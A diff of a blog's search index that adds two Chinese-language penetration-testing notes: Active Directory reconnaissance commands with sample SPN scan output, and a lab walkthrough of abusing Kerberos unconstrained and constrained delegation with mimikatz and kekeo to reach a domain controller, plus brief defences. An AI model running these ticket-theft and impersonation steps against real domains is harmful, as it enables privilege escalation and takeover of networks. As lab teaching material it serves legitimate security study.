@@ -4,6 +4,230 @@
   
     
     <entry>
+      <title><![CDATA[域渗透-域内信息收集]]></title>
+      <url>https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.html</url>
+      <content type="html"><![CDATA[<h3><span id="常用收集域信息命令">常用收集域信息命令</span></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Net use</span><br><span class="line">Net view</span><br><span class="line">Tasklist /v</span><br><span class="line">Ipconfig /all </span><br><span class="line">net group /domain 获得所有域用户组列表</span><br><span class="line">net group “domain admins” /domain 获得域管理员列表</span><br><span class="line">net group “enterprise admins” /domain 获得企业管理员列表</span><br><span class="line">net localgroup administrators /domain 获取域内置administrators组用户（enterprise admins、domain admins）</span><br><span class="line">net group “domain controllers” /domain 获得域控制器列表</span><br><span class="line">net group “domain computers” /domain 获得所有域成员计算机列表</span><br><span class="line">net user /domain 获得所有域用户列表</span><br><span class="line">net user someuser /domain 获得指定账户someuser的详细信息</span><br><span class="line">net accounts /domain 获得域密码策略设置，密码长短，错误锁定等信息</span><br><span class="line">nltest /domain_trusts 获取域信任信息</span><br></pre></td></tr></table></figure>
+<h3><span id="spn扫描">SPN扫描</span></h3><p>不同于常规的tcp/udp端口扫描，由于spn本质就是正常的Kerberos请求，所以扫描是非常隐蔽，日前针对此类扫描的检测暂时也比较少。</p>
+<p>大部分win系统默认已自带spn探测工具即：<code>setspn.exe</code></p>
+<p>此操作无需管理权限</p>
+<p>域内机器执行</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q */*</span><br></pre></td></tr></table></figure>
+<p>可完整查出当前域内所有spn。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">Checking domain DC=rootkit,DC=org</span><br><span class="line">CN=OWA2013,OU=Domain Controllers,DC=rootkit,DC=org</span><br><span class="line">	IMAP/OWA2013</span><br><span class="line">	IMAP/OWA2013.rootkit.org</span><br><span class="line">	IMAP4/OWA2013</span><br><span class="line">	IMAP4/OWA2013.rootkit.org</span><br><span class="line">	POP/OWA2013</span><br><span class="line">	POP/OWA2013.rootkit.org</span><br><span class="line">	POP3/OWA2013</span><br><span class="line">	POP3/OWA2013.rootkit.org</span><br><span class="line">	exchangeRFR/OWA2013</span><br><span class="line">	exchangeRFR/OWA2013.rootkit.org</span><br><span class="line">	exchangeMDB/OWA2013</span><br><span class="line">	exchangeMDB/OWA2013.rootkit.org</span><br><span class="line">	SMTP/OWA2013</span><br><span class="line">	SMTP/OWA2013.rootkit.org</span><br><span class="line">	SmtpSvc/OWA2013</span><br><span class="line">	SmtpSvc/OWA2013.rootkit.org</span><br><span class="line">	exchangeAB/OWA2013</span><br><span class="line">	exchangeAB/OWA2013.rootkit.org</span><br><span class="line">	Dfsr-12F9A27C-BF97-4787-9364-D31B6C55EB04/OWA2013.rootkit.org</span><br><span class="line">	ldap/OWA2013.rootkit.org/ForestDnsZones.rootkit.org</span><br><span class="line">	ldap/OWA2013.rootkit.org/DomainDnsZones.rootkit.org</span><br><span class="line">	TERMSRV/OWA2013</span><br><span class="line">	TERMSRV/OWA2013.rootkit.org</span><br><span class="line">	DNS/OWA2013.rootkit.org</span><br><span class="line">	GC/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">	RestrictedKrbHost/OWA2013.rootkit.org</span><br><span class="line">	RestrictedKrbHost/OWA2013</span><br><span class="line">	RPC/58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">	HOST/OWA2013/ROOTKIT</span><br><span class="line">	HOST/OWA2013.rootkit.org/ROOTKIT</span><br><span class="line">	HOST/OWA2013</span><br><span class="line">	HOST/OWA2013.rootkit.org</span><br><span class="line">	HOST/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">	E3514235-4B06-11D1-AB04-00C04FC2DCD2/58650e64-9681-4c62-b26e-7914b9041f72/rootkit.org</span><br><span class="line">	ldap/OWA2013/ROOTKIT</span><br><span class="line">	ldap/58650e64-9681-4c62-b26e-7914b9041f72._msdcs.rootkit.org</span><br><span class="line">	ldap/OWA2013.rootkit.org/ROOTKIT</span><br><span class="line">	ldap/OWA2013</span><br><span class="line">	ldap/OWA2013.rootkit.org</span><br><span class="line">	ldap/OWA2013.rootkit.org/rootkit.org</span><br><span class="line">CN=krbtgt,CN=Users,DC=rootkit,DC=org</span><br><span class="line">	kadmin/changepw</span><br><span class="line">CN=dbadmin,OU=运维部,DC=rootkit,DC=org</span><br><span class="line">	MSSQLSvc/Srv-Web-Kit.rootkit.org:1433</span><br><span class="line">	MSSQLSvc/Srv-Web-Kit.rootkit.org</span><br><span class="line">CN=SRV-WEB-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">	TERMSRV/SRV-WEB-KIT</span><br><span class="line">	TERMSRV/Srv-Web-Kit.rootkit.org</span><br><span class="line">	WSMAN/Srv-Web-Kit</span><br><span class="line">	WSMAN/Srv-Web-Kit.rootkit.org</span><br><span class="line">	RestrictedKrbHost/SRV-WEB-KIT</span><br><span class="line">	HOST/SRV-WEB-KIT</span><br><span class="line">	RestrictedKrbHost/Srv-Web-Kit.rootkit.org</span><br><span class="line">	HOST/Srv-Web-Kit.rootkit.org</span><br><span class="line">CN=PC-JERRY-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">	RestrictedKrbHost/PC-JERRY-KIT</span><br><span class="line">	HOST/PC-JERRY-KIT</span><br><span class="line">	RestrictedKrbHost/PC-jerry-Kit.rootkit.org</span><br><span class="line">	HOST/PC-jerry-Kit.rootkit.org</span><br><span class="line">CN=PC-MICLE-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">	RestrictedKrbHost/PC-MICLE-KIT</span><br><span class="line">	HOST/PC-MICLE-KIT</span><br><span class="line">	RestrictedKrbHost/PC-micle-Kit.rootkit.org</span><br><span class="line">	HOST/PC-micle-Kit.rootkit.org</span><br><span class="line">CN=PC-TORNDO-KIT,CN=Computers,DC=rootkit,DC=org</span><br><span class="line">	HOST/PC-TORNDO-KIT</span><br><span class="line">	HOST/pc-torndo-Kit.rootkit.org</span><br><span class="line">CN=sqladmin,OU=运维部,DC=rootkit,DC=org</span><br><span class="line">	variant/golden</span><br><span class="line"></span><br><span class="line">Existing SPN found!</span><br></pre></td></tr></table></figure>
+<h3><span id="定位域控">定位域控</span></h3><h4><span id="查询dns解析记录">查询dns解析记录</span></h4><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type=all _ldap._tcp.dc._msdcs.rootkit.org</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979004463.png" alt="1566979004463"></p>
+<h4><span id="spn扫描">SPN扫描</span></h4><p>在SPN扫描结果中可以通过<code>CN=OWA2013,OU=Domain Controllers,DC=rootkit,DC=org</code>来进行域控的定位。</p>
+<h4><span id="net-group">net group</span></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;domain controllers&quot; /domain</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979395890.png" alt="1566979395890"></p>
+<h4><span id="端口识别">端口识别</span></h4><p>扫描内网中同时开放389和53端口的机器。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">端口：389</span><br><span class="line">服务：LDAP、ILS</span><br><span class="line">说明：轻型目录访问协议和NetMeeting Internet Locator Server共用这一端口。</span><br><span class="line"></span><br><span class="line">端口：53</span><br><span class="line">服务：Domain Name Server（DNS）</span><br><span class="line">说明：53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。</span><br></pre></td></tr></table></figure>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566979627122.png" alt="1566979627122"></p>
+<h3><span id="域内关键组">域内关键组</span></h3><p>比如在拿到域控后可以通过重点关注关键部门人员的机器来得到更多的信息。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com\1566980640086.png" alt="1566980640086"></p>
+<p>以上图为例，我们可以重点关注和监控运维部的用户机器，通常他们的机器上存在大量内网网络拓扑和网络构架信息或者是一些重要的密码本。</p>
+<h3><span id="adfind">AdFind</span></h3><p>C++实现(未开源)，用于查询域内信息</p>
+<p><a href="http://www.joeware.net/freetools/tools/adfind/index.htm" target="_blank" rel="noopener">http://www.joeware.net/freetools/tools/adfind/index.htm</a></p>
+<p>常用命令如下：</p>
+<p>列出域控制器名称：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>
+<p>查询当前域中在线的计算机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure>
+<p>查询当前域中在线的计算机(只显示名称和操作系统)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure>
+<p>查询当前域中所有计算机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory=computer&quot;</span><br></pre></td></tr></table></figure>
+<p>查询当前域中所有计算机(只显示名称和操作系统)：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory=computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure>
+<p>查询域内所有用户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure>
+<p>查询所有GPO：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>]]></content>
+      
+        <categories>
+            
+            <category> 笔记 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
+      <title><![CDATA[域渗透-Delegation]]></title>
+      <url>https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Delegation.html</url>
+      <content type="html"><![CDATA[<h3><span id="委派">委派</span></h3><p>在域中如果出现A使用Kerberos身份验证访问域中的服务B，而B再利用A的身份去请求域中的服务C，这个过程就可以理解为委派。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1552649799_5c8b8e47c2172.png" alt="img"></p>
+<p>User访问主机s2上的HTTP服务，而HTTP服务需要请求其他主机的SQLServer数据库，但是S2并不知道User是否有权限访问SQLServer，这时HTTP服务会利用User的身份去访问SQLServer，如果User有权限访问SQLServer服务才能访问成功。</p>
+<p>而委派主要分为非约束委派（Unconstraineddelegation）和约束委派（Constrained delegation）两个方式。</p>
+<h4><span id="非约束委派">非约束委派</span></h4><p>非约束委派在Kerberos中实现时，User会将从KDC处得到的TGT发送给访问的service1（可以是任意服务），service1拿到TGT之后可以通过TGT访问域内任意其他服务，所以被称为非约束委派。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1552649941_5c8b8ed5b18f6.png" alt="img"></p>
+<p><strong>流程：</strong></p>
+<blockquote>
+<ol>
+<li><p>用户通过发送KRB_AS_REQ消息请求可转发 TGT（forwardable TGT，为了方便我们称为TGT1）。</p>
+</li>
+<li><p>KDC在KRB_AS_REP消息中返回TGT1。</p>
+</li>
+<li><p>用户再通过TGT1向KDC请求转发TGT（forwardedTGT，我们称为TGT2）。</p>
+</li>
+<li><p>在KRB_TGS_REP消息中返回转发TGT2。</p>
+</li>
+<li><p>用户使用TGT1向KDC申请访问Service1的ST（ServiceTicket）。</p>
+</li>
+<li><p>TGS返回给用户一个ST。</p>
+</li>
+<li><p>用户发送KRB_AP_REQ请求至Service1，这个请求中包含了TGT1和ST、TGT2、TGT2的SessionKey。</p>
+</li>
+<li><p>Service1使用用户的TGT2通过KRB_TGS_REQ发送给KDC，以用户的名义请求能够访问Service2的票据。</p>
+</li>
+<li><p>KDC在KRB_TGS_REP消息中返回Service2到Service1的票据。</p>
+</li>
+<li><p>Service1以用户的名义像Service2发送KRB_AP_REQ请求。</p>
+</li>
+<li><p>Service2响应步骤10中Service1的请求。</p>
+</li>
+<li><p>Service1响应步骤7中用户的请求。</p>
+</li>
+<li><p>在这个过程中的TGT转发机制，没有限制Service1对TGT2的使用，也就是说Service1可以通过TGT2来请求任意服务。</p>
+</li>
+<li><p>KDC返回步骤13中请求的票据。</p>
+</li>
+</ol>
+<p>15和16即为Service1通过模拟用户来访问其他Service。</p>
+</blockquote>
+<p>可以看到在前5个步骤中User向KDC申请了两个TGT（步骤2和4），一个用于访问Service1一个用于访问Service2，并且会将这两个都发给Service1。并且Service1会将TGT2保存在内存中。</p>
+<p><strong>非约束委派的设置：</strong></p>
+<p>Windows域中可以直接在账户属性中设置：</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566916812731.png" alt="1566916812731"></p>
+<h4><span id="约束委派">约束委派</span></h4><p>由于非约束委派的不安全性，微软在windows2003中发布了约束委派的功能。约束委派在Kerberos中User不会直接发送TGT给服务，而是对发送给service1的认证信息做了限制，不允许service1代表User使用这个TGT去访问其他服务。这里包括一组名为S4U2Self（Service for User to Self）和S4U2Proxy（Service forUser to Proxy）的Kerberos协议扩展。</p>
+<p>从下图可以看到整个过程其实可以分为两个部分，第一个是S4U2Self的过程（流程1-4），第二个是S4U2Proxy的过程（流程5-10）。</p>
+<p><img src="https://uknowsec-1251971873.cos.ap-shanghai.myqcloud.com/1552650016_5c8b8f20208e8.png" alt="img"></p>
+<p><strong>流程：</strong></p>
+<blockquote>
+<ol>
+<li><p>用户向Service1发送请求。</p>
+</li>
+<li><p>这时在官方文档中的介绍是在这一流程开始之前Service1已经通过KRB_AS_REQ得到了用户用来访问Service1的TGT，然后通过S4U2self扩展模拟用户向KDC请求ST。</p>
+</li>
+<li><p>KDC这时返回给Service1一个用于用户验证Service1的ST（我们称为ST1），并且Service1用这个ST1完成和用户的验证过程。</p>
+</li>
+<li><p>Service1在步骤3使用模拟用户申请的ST1完成与用户的验证，然后响应用户。</p>
+</li>
+</ol>
+<p>注：这个过程中其实Service1是获得了用户的TGT和ST1的，但是S4U2Self扩展不允许Service1代表用户去请求其他的服务。</p>
+<ol>
+<li>用户再次向Service1发起请求，此时Service1需要以用户的身份访问Service2。这里官方文档提到了两个点：</li>
+</ol>
+<p>A.Service1已经验证通过，并且有一个有效的TGT。</p>
+<p>B.Service1有从用户到Service1的forwardableST（可转发ST）。个人认为这里的forwardable ST其实也就是ST1。</p>
+<ol>
+<li><p>Service1代表用户向Service2请求一个用于认证Service2的ST（我们称为ST2）。用户在ST1中通过cname（client name）和crealm（client realm）字段标识。</p>
+</li>
+<li><p>KDC在接收到步骤6中Service1的请求之后，会验证PAC（特权属性证书，在第一篇中有说明）的数字签名。如果验证成功或者这个请求没有PAC（不能验证失败），KDC将返回ST2给Service1，不过这个ST2中cname和crealm标识的是用户而不是Service1。</p>
+</li>
+<li><p>Service1代表用户使用ST2请求Service2。Service2判断这个请求来自已经通过KDC验证的用户。</p>
+</li>
+<li><p>Service2响应Service1的请求。</p>
+</li>
+<li><p>Service1响应用户的请求。</p>
+</li>
+</ol>
+</blockquote>
+<p>在这个过程中，S4U2Self扩展的作用是让Service1代表用户向KDC验证用户的合法性，并且得到一个可转发的ST1。S4U2Proxy的作用可以说是让Service1代表用户身份通过ST1重新获取ST2，并且不允许Service1以用户的身份去访问其他服务。更多的细节可以参考官方的文档，和RFC4120的内容。</p>
+<p>同时注意forwardable字段，有forwardable标记为可转发的是能够通过S4U2Proxy扩展协议进行转发的，如果没有标记则不能进行转发。</p>
+<p><strong>约束委派的配置：</strong></p>
+<p>可以在账户属性中将SRV-DB-ODAY的委派方式更改为约束委派</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566741406966.png" alt="1566741406966"></p>
+<h3><span id="发现域中的委派主机或账户">发现域中的委派主机或账户</span></h3><p>在域中，可以通过PowerView脚本来搜索开启了委派的主机和用户。查询非约束委派主要是通过搜索userAccountControl属性包含ADS_UF_TRUSTED_FOR_DELEGATION的主机或账户。而约束委派则通过查询userAccountControl属性包含TRUSTED_TO_AUTH_FOR_DELEGATION的主机或用户。</p>
+<h4><span id="非约束委派">非约束委派</span></h4><p>通过<code>Import-Module PowerView.ps1</code>加载PowerView脚本之后使用下面的命令进行查询。</p>
+<p>查询域中配置非约束委派的账户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetUser -Unconstrained -Domain rootkit.org</span><br></pre></td></tr></table></figure>
+<p>查询域中配置非约束委派的主机：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer -Unconstrained -Domain rootkit.org</span><br></pre></td></tr></table></figure>
+<h4><span id="约束委派">约束委派</span></h4><p>查询域中配置约束委派的账户：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainUser -TrustedToAuth -Domain rootkit.org</span><br></pre></td></tr></table></figure>
+<p>查询域中配置约束委派的主机:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer -TrustedToAuth -Domain rootkit.org</span><br></pre></td></tr></table></figure>
+<h3><span id="委派攻击利用">委派攻击利用</span></h3><h4><span id="非约束委派的利用">非约束委派的利用</span></h4><p>假设已经获取了一个已经配置了委派的账户权限或者是密码，现在我们通过这些条件来攻击其他账户。</p>
+<p>在域中只有服务账户才能有委派功能，所以先把用户sqladmin设置为服务账号。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -U -A variant/golden sqladmin</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566919031159.png" alt="1566919031159"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -l sqladmin</span><br></pre></td></tr></table></figure>
+<p>查看配置成功。</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566919063736.png" alt="1566919063736"></p>
+<p>然后在“AD用户和计算机”中将sqladmin设置为非约束委派模式</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566919256739.png" alt="1566919256739"></p>
+<p>在域控上使用<code>Administrator</code>访问<code>sqladmin</code>所在主机<code>Srv-Web-Kit</code>的SMB服务。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\Srv-Web-Kit.rootkit.org\c$</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566921302149.png" alt="1566921302149"></p>
+<p>在Srv-Web-Kit上通过mimikatz可以导出Administrator发送过来的TGT内容。这里需要使用管理员权限打开mimikatz，然后通过privilege::debug命令提升权限，如果没有提升权限会报kuhl_m_sekurlsa_acquireLSA错误。再使用sekurlsa::tickets/export命令导出内存中所有的票据。</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566921630936.png" alt="1566921630936"></p>
+<p>访问域控失败</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566921730332.png" alt="1566921730332"></p>
+<p>通过</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt [0;a17510]-2-0-60a10000-Administrator@krbtgt-ROOTKIT.ORG.kirbi</span><br></pre></td></tr></table></figure>
+<p>命令将TGT内容导入到当前会话中。</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566921999832.png" alt="1566921999832"></p>
+<p>导入之后已经可以访问域控的共享目录。也就是说每当存在用户访问tsvc的服务时，tsvc的服务就会将访问者的TGT保存在内存中，可以通过这个TGT访问这个TGT所属用户的所有服务。</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566922095168.png" alt="1566922095168"></p>
+<h4><span id="约束委派的利用">约束委派的利用</span></h4><p>假设已知配置了约束委派的账号，并且已知当前配置了约束委派的当前账户的密码。</p>
+<ol>
+<li>确认账号sqladmin设置了约束委派。</li>
+</ol>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566959744980.png" alt="1566959744980"></p>
+<ol>
+<li>使用kekeo对域控发起申请TGT的请求。</li>
+</ol>
+<p>通过已知的账户名和明文密码对KDC发起请求，得到TGT。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:sqladmin /domain:rootkit.org /password:Admin12345 /ticket:sqladmin.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566960698566.png" alt="1566960698566"></p>
+<blockquote>
+<p>/user:当前用户名</p>
+<p>/domain:所在域名</p>
+<p>/password:当前用户名的密码</p>
+<p>/ticket:生成票据名称。</p>
+</blockquote>
+<ol>
+<li><p>使用kekeo申请TGS票据</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566961060838.png" alt="1566961060838"></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_sqladmin@ROOTKIT.ORG_krbtgt~rootkit.org@ROOTKIT.ORG.kirbi /user:administrator@rootkit.org /service:cifs/owa2013.rootkit.org</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<blockquote>
+<p>/tgt:上一步通过kekeo生成的tgt票据</p>
+<p>/user:想要伪造的用户名写全称（用户名@域名）</p>
+<p>/service:想要伪造访问的服务名（服务名/主机的FQDN名称)</p>
+</blockquote>
+<ol>
+<li>使用mimikatz将生成的TGS文件导入到Kerberos凭据列表中</li>
+</ol>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566961661084.png" alt="1566961661084"></p>
+<p>这时可以看到导入之后已经能够成功访问域控的共享文件（严格来说应该是非约束委派中设置的SPN的权限）。而且在这个过程中是不需要管理员权限的，只是用当前账户的权限就可以完成，因为不需要从内存中导出票据。</p>
+<p>非约束委派去获得所设置的SPN的权限主要是三个步骤</p>
+<blockquote>
+<p>1、请求TGT</p>
+<p>2、请求TGS</p>
+<p>3、将TGS导入内存</p>
+</blockquote>
+<p>第1步，使用Kekeo发起AS-REQ请求去请求TGT。这时sqladmin获取到了一个TGT，并且kekeo工具将其保存为一个kirbi格式的文件。</p>
+<p>第2步，再使用这个TGT申请两个ST文件，上文中说到过在约束委派实现的过程中分为两个部分，分别是S4U2Self扩展和S4U2Proxy扩展。S4U2Self中Service1会代替用户向KDC申请一张用于访问自身的TGS，这个TGS也就是生成的两个TGS中的一个（TGS_administrator@rootkit.org@ROOTKIT.ORG_sqladmin@ROOTKIT.ORG.kirbi）还有一个TGS是用于访问非受限委派中设置的SPN的TGS（TGS_administrator@rootkit.org@ROOTKIT.ORG_cifs~owa2013.rootkit.org@ROOTKIT.ORG.kirbi）。</p>
+<p>关于约束委派的这种攻击方式就是通过在Service1（sqladmin）中将自己伪造成用户，然后获取允许约束委派的SPN的TGS的一个过程。</p>
+<h3><span id="委派攻击的防御">委派攻击的防御</span></h3><p>通过上文中说到设置了非约束委派的账户权限如果被窃取那么攻击者可能获取非常多其他账户的TGT，所以最好是不要在域中使用非约束委派这种功能。</p>
+<p>域中不需要使用委派的账户特别是administrator账户，设置为“敏感用户不能被委派”。</p>
+<p><img src="C:\Users\HP\AppData\Roaming\Typora\typora-user-images\1566964360982.png" alt="1566964360982"></p>
+]]></content>
+      
+        <categories>
+            
+            <category> 笔记 </category>
+            
+        </categories>
+        
+        
+    </entry>
+    
+    <entry>
       <title><![CDATA[域渗透-Ticket]]></title>
       <url>https://uknowsec.cn/posts/notes/%E5%9F%9F%E6%B8%97%E9%80%8F-Ticket.html</url>
       <content type="html"><![CDATA[<h3><span id="goldenticket">GoldenTicket</span></h3><h4><span id="简介">简介</span></h4><p>Golden Ticket（下面称为金票）是通过伪造的TGT（TicketGranting Ticket），因为只要有了高权限的TGT，那么就可以发送给TGS换取任意服务的ST。可以说有了金票就有了域内的最高权限。</p>
@@ -3927,7 +4151,7 @@
 <h2><span id="使用commit命令从容器的修改中创建镜像">使用commit命令从容器的修改中创建镜像</span></h2><p>docker commit 命令从容器的修改中创建新的镜像<br>假设hello-nginx容器中的文件内容发生变化，将容器创建为镜像文件。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker commit -a &quot;Foo Bar &lt;foo@bar.com&gt;&quot; -m &quot;add hello.txt&quot; hello-nginx hello:0.2</span><br></pre></td></tr></table></figure>
 <p>命令格式为docker commit &lt;选项&gt;&lt;容器名称&gt;&lt;镜像名称&gt;：&lt;标签&gt;</p>
-<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#58;&#102;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#x2e;&#99;&#111;&#109;">&#102;&#x6f;&#x6f;&#64;&#98;&#97;&#x72;&#x2e;&#99;&#111;&#109;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
+<p>-a “Foo Bar<a href="&#x6d;&#97;&#105;&#x6c;&#x74;&#111;&#x3a;&#102;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#x2e;&#x63;&#111;&#x6d;">&#102;&#111;&#x6f;&#x40;&#x62;&#x61;&#x72;&#x2e;&#x63;&#111;&#x6d;</a>“与 -m “add hello.txt”选项用于设置提交的用户与注册信息。将hello-nginx容器创建hello:0.2镜像</p>
 <h2><span id="使用diff命令检查容器文件的修改">使用diff命令检查容器文件的修改</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker diff hello-nginx</span><br></pre></td></tr></table></figure>
 <p>命令格式为docker diff&lt;容器名称&gt;，A为添加文件，C为修改的文件，D为删除的文件。</p>
 <h2><span id="使用inspect命令查看详细信息">使用inspect命令查看详细信息</span></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker inspect hello-nginx</span><br></pre></td></tr></table></figure>
